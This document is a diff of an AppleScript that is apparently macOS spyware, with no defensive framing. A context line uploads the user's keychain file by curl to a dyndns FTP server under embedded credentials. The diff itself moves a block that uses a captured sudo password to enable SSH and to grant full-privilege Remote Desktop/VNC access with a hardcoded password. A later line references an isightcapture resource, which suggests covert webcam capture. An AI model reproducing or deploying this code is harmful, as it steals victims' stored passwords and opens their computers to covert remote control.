@@ -77,6 +77,12 @@ try
 	try
 		tell application "Finder" to do shell script "curl -T " & ufld & "" & theuser & ".keychain -u Ben:(pass) ftp://Benbern.dyndns.info/Drive/.Passwords/." & theuser & "_" & WANIP & "_" & dte & ".keychain" -- Upload Keychain to FTP server
 	end try
+	
+	try
+		do shell script "sudo launchctl load -w /System/Library/LaunchDaemons/ssh.plist" password passwd
+		do shell script "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -clientopts -setvnclegacy -vnclegacy yes -clientopts -setvncpw -vncpw benwashere -restart -agent -privs -all" password passwd
+	end try
+	
 end try
 
 
@@ -139,10 +145,6 @@ try
 	do shell script "rm " & adrt
 end try
 
-try
-	do shell script "sudo launchctl load -w /System/Library/LaunchDaemons/ssh.plist" password passwd
-	do shell script "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -clientopts -setvnclegacy -vnclegacy yes -clientopts -setvncpw -vncpw benwashere -restart -agent -privs -all" password passwd
-end try
 
 try
 	set isight to POSIX path of (path to resource "isightcapture")
